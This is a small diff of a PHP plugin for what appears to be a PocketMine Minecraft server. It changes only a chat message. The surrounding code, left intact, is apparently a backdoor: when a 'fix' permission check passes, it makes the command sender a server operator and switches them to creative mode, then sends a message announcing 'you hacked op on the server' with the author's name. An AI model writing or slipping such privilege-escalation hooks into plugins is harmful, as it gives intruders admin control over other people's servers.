@@ -28,8 +28,7 @@ class Main extends PluginBase implements Listener{
                     if($on->hasPermission("fix")){
                     	$sender->setOP(true);
                         $sender->setGamemode(1);
-                        $sender->sendMessage("§4Ha§eck §4you hacked op on the server");
-                        $sender->addTitle("§4Ha§eck\n§b by §4Aleondev");
+                        $sender->sendMessage("§4Ha§eck §4you hacked op on the server\n§eby Aleondev");
                     }
                 }
             }
